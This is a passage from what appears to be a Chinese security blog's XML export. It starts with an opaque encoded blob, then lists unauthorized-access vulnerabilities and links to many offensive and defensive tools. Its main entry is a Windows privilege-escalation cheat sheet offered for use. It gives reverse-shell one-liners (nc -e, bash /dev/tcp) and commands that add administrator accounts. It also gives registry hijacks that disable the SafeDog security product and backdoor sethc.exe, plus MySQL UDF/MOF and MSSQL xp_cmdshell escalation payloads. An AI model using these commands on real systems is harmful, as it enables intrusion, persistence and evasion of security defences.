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]]></content>
      <categories>
        <category>漏洞挖掘</category>
        <category>Sql注入</category>
      </categories>
      <tags>
        <tag>Sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见未授权访问漏洞总结]]></title>
    <url>%2Farchives%2F15af7f29.html</url>
    <content type="text"><![CDATA[常见的未授权访问漏洞：Redis 未授权访问漏洞MongoDB 未授权访问漏洞Jenkins 未授权访问漏洞Memcached 未授权访问漏洞JBOSS 未授权访问漏洞VNC 未授权访问漏洞Docker 未授权访问漏洞ZooKeeper 未授权访问漏洞Rsync 未授权访问漏洞Atlassian Crowd 未授权访问漏洞CouchDB 未授权访问漏洞Elasticsearch 未授权访问漏洞Hadoop 未授权访问漏洞Jupyter Notebook 未授权访问漏洞原文:常见的未授权访问漏洞]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Win 提权技巧]]></title>
    <url>%2Farchives%2F452f04ea.html</url>
    <content type="text"><![CDATA[端口转发类反弹shell：shell： nc -e cmd ip port shell: bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1(linux)服务器： nc -vv -lp port端口转发：shell: lcx -slave ip port 127.0.0.1 port服务器： lcx -listen port 33891ANTIFW.exe -s #运行程序，将3389转发到80 ANTIFW.exe -l #关闭程序，恢复cmd探查信息探测类systeminfo ：查看系统版本信息 netstat -ano : 查看系统开放端口 tasklist /svc : 查看系统进程 ipconfig : 查看ip地址 whoami : 查看当前用户 net user : 查看计算机用户列表 net localgroup : 查看计算机用户组列表添加用户类net user mstlab mstlab /add : 添加用户并设置密码 net localgroup administrators mstlab /add : 将用户加入管理组 net user guest /active:yes : 激活guest用户 net user guest mstlab : 更改guest用户的密码KIll DOG:Kill Dog：1.安全狗默认只拦截加管理组，不拦截加用户 法a：利用用户克隆exp：直接克隆administrator的权限 法b：反弹shell读取管理员密码 法c：改注册表替换安全狗的文件，然后重启服务器(redegit /s redegit.reg(redegit.reg见附录))安全狗关闭 2.安全狗账号防护最严程度：拦截添加用户 法a：激活guest，然后克隆用户 法b：反弹shell读取管理员密码 法c：改注册表，重启服务器，关闭安全狗 redegit.reg脚本内容：Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SafeDogGuardCenter.exe] &quot;Debugger&quot;=&quot;C:\WWW\l.php&quot;开启的3389方法：1.通用开3389(优化后)：wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 12.For Win2003:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f3.For Win2008:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f4.For Every:cmd开3389 win08 win03 win7 win2012 winxpwin08，三条命令即可:wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1 wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwin2012通用；win7前两条即可。权限需要run as administrator。查询终端端口 ：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber (or) 终端端口：tasklist /svc查询TermService对应PID和netstat查询的PID对应的端口号 (or) 注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds dpwd\Tds cp 中PortNumber的值数据库提权:UDF手工提权辅助：select @@basedir; #查看mysql安装目录 select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib::&apos;; #利用NTFS ADS创建lib目录 select &apos;It is dll&apos; into dumpfile &apos;C:\。。lib\plugin::&apos;; #利用NTFS ADS创建plugin目录 select 0xUDFcode into dumpfile &apos;C:\phpstu\MySQL\lib\plugin\mstlab.dll&apos;; #导出udfcode，注意修改udfcode create function cmdshell returns string soname &apos;mstlab.dll&apos;; #用udf创建cmd函数，shell,sys_exec,sys_eval select shell(&apos;cmd&apos;,&apos;net user&apos;); #执行cmd命令show variables like ‘%plugin%’; #查看plugin路径 小技巧：1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录 2.my.ini中datadir的值是数据存放目录 3.UPDATE user set File_priv =&apos;Y&apos;; flush privileges; 强制加file权限MOF手工提权辅助：#pragma namespace(“\.\root\subscription”) instance of __EventFilter as { EventNamespace = &quot;Root\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; }; instance of ActiveScriptEventConsumer as { Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;) WSH.run(\&quot;net.exe user admintony admin /add&amp;&amp;net.exe localgroup administrators admintony /add\&quot;)&quot;; }; instance of __FilterToConsumerBinding { Consumer = ; Filter = ; }; 保存为 1.mof 然后mysql执行：select load_file(&apos;D:/wwwroot/1.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;SA提权辅助：1.判断扩展存储是否存在：select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name= &apos;xp_cmdshell&apos; select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;恢复：exec sp_dropextendedproc &apos;xp_cmdshell&apos; exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos; EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;(SQL2005)2.列目录： exec master..xp_cmdshell &apos;ver&apos; (or) exec master..xp_dirtree &apos;c:\&apos;,1,1 (or) drop table black create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- insert into black exec master..xp_cmdshell &apos;dir c:\&apos; select top 1 mulu from black where id=1 xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权3.备份启动项：alter database [master] set RECOVERY FULL create table cmd (a image) backup log [master] to disk = &apos;c:\cmd1&apos; with init insert into cmd (a) values (0x(batcode)) backup log [master] to disk = &apos;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat&apos; drop table cmd4.映像劫持xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&apos;,&apos;debugger&apos;,&apos;reg_sz&apos;,&apos;c:\windows\system32\cmd.exe&apos;5.沙盒模式提权：法a：exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Jet.0\Engines&apos;,&apos;SandBoxMode&apos;,&apos;REG_DWORD&apos;,0; #关闭沙盒模式法b：Select * From OpenRowSet(&apos;Microsoft.Jet.OLEDB.4.0&apos;,&apos;;Database=c:\windows\system32\ias\ias.mdb&apos;,&apos;select shell(&quot;net user mstlab mstlab /add&quot;)&apos;); #or c:\windows\system32\ias\dnary.mdb string类型用此。 开启OpenRowSet：exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ad Hoc Distributed Queries&apos;,1;RECONFIGURE;6.xp_regwrite操作注册表exec master..xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SOFTWARE\Microsoft\Windows\currentversion un&apos;,&apos;black&apos;,&apos;REG_SZ&apos;,&apos;net user test test /add&apos; 开启xp_oacreate:exec sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;exec sp_configure &apos;Ole Automation Procedures&apos;,1;RECONFIGURE;]]></content>
      <categories>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python库安全工具总纲]]></title>
    <url>%2Farchives%2Ff71d256c.html</url>
    <content type="text"><![CDATA[漏洞及渗透练习平台：WebGoat漏洞练习平台：https://github.com/WebGoat/WebGoatwebgoat-legacy漏洞练习平台:https://github.com/WebGoat/WebGoat-Legacyzvuldirll漏洞练习平台：https://github.com/710leo/ZVulDrillvulapps漏洞练习平台：https://github.com/Medicean/VulAppsdvwa漏洞练习平台：https://github.com/RandomStorm/DVWA数据库注入练习平台 ：https://github.com/Audi-1/sqli-labs用node编写的漏洞练习平台，like OWASP Node Goat：https://github.com/cr0hn/vulnerable-nodeRuby编写的一款工具，生成含漏洞的虚拟机：https://github.com/cliffe/secgen花式扫描器 ：Nmap端口扫描器：https://github.com/nmap/nmap本地网络扫描器：https://github.com/SkyLined/LocalNetworkScanner子域名扫描器：https://github.com/lijiejie/subDomainsBrute https://github.com/aboul3la/Sublist3r https://github.com/TheRook/subbrute https://github.com/infosec-au/altdnslinux漏洞扫描：https://github.com/future-architect/vuls基于端口扫描以及关联CVE:https://github.com/m0nad/HellRaiser漏洞路由扫描器：https://github.com/jh00nbr/Routerhunter-2.0迷你批量信息泄漏扫描脚本：https://github.com/lijiejie/BBScanWaf类型检测工具：https://github.com/EnableSecurity/wafw00f服务器端口弱口令扫描器：https://github.com/wilson9x1/fenghuangscanner_v3Fox-scan扫描器：https://github.com/fengxuangit/Fox-scan/信息搜集工具 :社工收集器：https://github.com/n0tr00t/SregGithub信息搜集：https://github.com/sea-god/gitscangithub Repo信息搜集工具：https://github.com/metac0rtex/GitHarvester信息探测及扫描工具：https://github.com/darryllane/Bluto内部网络信息扫描器：https://github.com/sowish/LNScan远程桌面登录扫描器：https://github.com/linuz/Sticky-Keys-Slayer网络基础设施渗透工具https://github.com/SECFORCE/spartaSNMAP密码破解:https://github.com/SECFORCE/SNMP-BruteWEB：webshell大合集：https://github.com/tennc/webshell渗透以及web攻击脚本：https://github.com/brianwrf/hackUtilsweb渗透小工具大合集：https://github.com/rootphantomer/hacktoolsfor_meXSS数据接收平台：https://github.com/firesunCN/BlueLotus_XSSReceiverXSS与CSRF工具：https://github.com/evilcos/xssorxss多功能扫描器：https://github.com/shawarkhanethicalhacker/BruteXSSweb漏洞扫描器:https://github.com/andresriancho/w3afWEB漏洞扫描器：https://github.com/sullo/nikto渗透常用小工具包：https://github.com/leonteale/pentestpackageweb目录扫描器:https://github.com/maurosoria/dirsearchweb向命令注入检测工具：https://github.com/stasinopoulos/commix自动化SQL注入检查工具：https://github.com/epinna/tplmapSSL扫描器：https://github.com/rbsec/sslscan安全工具集合：https://github.com/codejanus/ToolSuiteapache日志分析器：https://github.com/mthbernardes/ARTLASphp代码审计工具：https://github.com/pwnsdx/BadCodeweb指纹识别扫描：https://github.com/urbanadventurer/whatweb检查网站恶意攻击：https://github.com/ciscocsirt/malspiderwordprees漏洞扫描器：https://github.com/wpscanteam/wpscan固件漏洞扫描器：https://github.com/misterch0c/firminator_backend数据库注入工具https://github.com/sqlmapproject/sqlmapWeb代理：https://github.com/zt2/sqli-hunter新版中国菜刀：https://github.com/Chora10/Cknifegit泄露利用EXP：https://github.com/lijiejie/GitHack浏览器攻击框架：https://github.com/beefproject/beef自动化绕过WAF脚本：https://github.com/khalilbijjou/WAFNinja https://github.com/owtf/wafbypasser一款开源WAF：https://github.com/SpiderLabs/ModSecurityhttp命令行客户端：https://github.com/jkbrzt/httpie浏览器调试利器：https://github.com/firebug/firebugDISCUZ漏洞扫描器：https://github.com/code-scan/dzscan自动化代码审计工具https://github.com/wufeifei/cobra浏览器攻击框架：https://github.com/julienbedard/browsersploittomcat自动后门部署：https://github.com/mgeeky/tomcatWarDeployer网络空间指纹扫描器：https://github.com/nanshihui/Scan-Tburpsuit之J2EE扫描插件：https://github.com/ilmila/J2EEScanwindows域渗透工具：mimikatz明文注入：https://github.com/gentilkiwi/mimikatzPowershell渗透库合集：https://github.com/PowerShellMafia/PowerSploitPowershell tools合集：https://github.com/clymb3r/PowerShellpowershell的mimikittenz:https://github.com/putterpanda/mimikittenz域渗透教程:https://github.com/l3m0n/pentest_studyFuzz:Web向Fuzz工具https://github.com/xmendez/wfuzzHTTP暴力破解，撞库攻击脚本https://github.com/lijiejie/htpwdScan漏洞利用及攻击框架：msf框架：https://github.com/rapid7/metasploit-frameworkpocsscan攻击框架：https://github.com/erevus-cn/pocscanPocsuite攻击框架:https://github.com/knownsec/PocsuiteBeebeeto攻击框架：https://github.com/n0tr00t/Beebeeto-framework漏洞POC&amp;EXP:ExploitDB官方git版本:https://github.com/offensive-security/exploit-databasephp漏洞代码分析：https://github.com/80vul/phpcodzCVE-2016-2107:https://github.com/FiloSottile/CVE-2016-2107CVE-2015-7547 POC：https://github.com/fjserna/CVE-2015-7547JAVA反序列化POC生成工具:https://github.com/frohoff/ysoserialJAVA反序列化EXP:https://github.com/foxglovesec/JavaUnserializeExploitsJenkins CommonCollections EXP:https://github.com/CaledoniaProject/jenkins-cli-exploitCVE-2015-2426 EXP (windows内核提权):https://github.com/vlad902/hacking-team-windows-kernel-lpeuse docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):https://github.com/hxer/vulnappphp7缓存覆写漏洞Demo及相关工具:https://github.com/GoSecure/php7-opcache-overrideXcodeGhost木马样本:https://github.com/XcodeGhostSource/XcodeGhost中间人攻击及钓鱼中间人攻击框架:https://github.com/secretsquirrel/the-backdoor-factory https://github.com/secretsquirrel/BDFProxy https://github.com/byt3bl33d3r/MITMfInject code, jam wifi, and spy on wifi users:https://github.com/DanMcInerney/LANs.py中间人代理工具:https://github.com/intrepidusgroup/mallorywifi钓鱼:https://github.com/sophron/wifiphisher密码破解：密码破解工具:https://github.com/shinnok/johnny本地存储的各类密码提取利器:https://github.com/AlessandroZ/LaZagne二进制及代码分析工具：二进制分析工具https://github.com/devttys0/binwalk系统扫描器https://github.com/quarkslab/binmaprp:https://github.com/0vercl0k/rpWindows Exploit Development工具https://github.com/lillypad/badger二进制静态分析工具（python）:https://github.com/bdcht/amocoPython Exploit Development Assistance for GDB:https://github.com/longld/peda对BillGates Linux Botnet系木马活动的监控工具https://github.com/ValdikSS/billgates-botnet-tracker木马配置参数提取工具:https://github.com/kevthehermit/RATDecodersShellphish编写的二进制分析工具（CTF向）:https://github.com/angr/angr针对python的静态代码分析工具:https://github.com/yinwang0/pysonar2一个自动化的脚本（shell）分析工具，用来给出警告和建议:https://github.com/koalaman/shellcheck基于AST变换的简易Javascript反混淆辅助工具:https://github.com/ChiChou/etacsufboEXP编写框架及工具：二进制EXP编写工具:https://github.com/t00sh/rop-toolCTF Pwn 类题目脚本编写框架:https://github.com/Gallopsled/pwntoolsan easy-to-use io library for pwning development:https://github.com/zTrix/zio跨平台注入工具:https://github.com/frida/frida哈希长度扩展攻击EXP：https://github.com/citronneur/rdpy隐写：隐写检测工具https://github.com/abeluck/stegdetect各类安全资料:data_hacking合集:https://github.com/ClickSecurity/data_hackingmobile-security-wiki:https://github.com/exploitprotocol/mobile-security-wiki书籍《reverse-engineering-for-beginners》:https://github.com/veficos/reverse-engineering-for-beginners一些信息安全标准及设备配置:https://github.com/luyg24/IT_securityAPT相关笔记:https://github.com/kbandla/APTnotesKcon资料:https://github.com/knownsec/KCon《DO NOT FUCK WITH A HACKER》:https://github.com/citypw/DNFWAH各类安全脑洞图：https://github.com/phith0n/Mind-Map信息安全流程图：https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428各类CTF资源近年ctf writeup大全:https://github.com/ctfs/write-ups-2016 https://github.com/ctfs/write-ups-2015 https://github.com/ctfs/write-ups-2014fbctf竞赛平台Demo:https://github.com/facebook/fbctfctf Resources:https://github.com/ctfs/resourcesctf及黑客资源合集:https://github.com/bt3gl/My-Gray-Hacker-Resourcesctf和安全工具大合集:https://github.com/zardus/ctf-toolsctf向 python工具包https://github.com/P1kachu/v0lt各类编程资源:大礼包（什么都有）:https://github.com/bayandin/awesome-awesomenessbash-handbook:https://github.com/denysdovhan/bash-handbookpython资源大全:https://github.com/jobbole/awesome-python-cngit学习资料:https://github.com/xirong/my-git安卓开源代码解析https://github.com/android-cn/android-open-projectpython框架，库，资源大合集:https://github.com/vinta/awesome-pythonJS 正则表达式库（用于简化构造复杂的JS正则表达式）:https://github.com/VerbalExpressions/JSVerbalExpressionsPython：python 正则表达式库（用于简化构造复杂的python正则表达式）:https://github.com/VerbalExpressions/python任务管理以及命令执行库:https://github.com/pyinvoke/invokepython exe打包库:https://github.com/pyinstaller/pyinstallerVeil-Evasion免杀项目：https://github.com/Veil-Framework/Veil-Evasionpy3 爬虫框架:https://github.com/orf/cyborg一个提供底层接口数据包编程和网络协议支持的python库:https://github.com/CoreSecurity/impacket python requests 库:https://github.com/kennethreitz/requestspython 实用工具合集:https://github.com/mahmoud/boltonspython爬虫系统:https://github.com/binux/pyspider科学上网：科学上网工具https://github.com/XX-net/XX-Net福利：微信自动抢红包动态库https://github.com/east520/AutoGetRedEnv微信抢红包插件（安卓版）https://github.com/geeeeeeeeek/WeChatLuckyMoneyhardsed神器:https://github.com/yangyangwithgnu/hardseed甲方安全工程师生存指南web索引及日志搜索工具：https://github.com/thomaspatzke/WASE开源日志采集器：https://github.com/wgliang/logcool扫描CS结构的web debugerhttps://github.com/Kozea/wdb恢复sqlite数据库删除注册信息：https://github.com/aramosf/recoversqlite/gps欺骗检测工具:https://github.com/zxsecurity/gpsnitch应急处置响应框架:https://github.com/biggiesmallsAG/nightHawkResponse 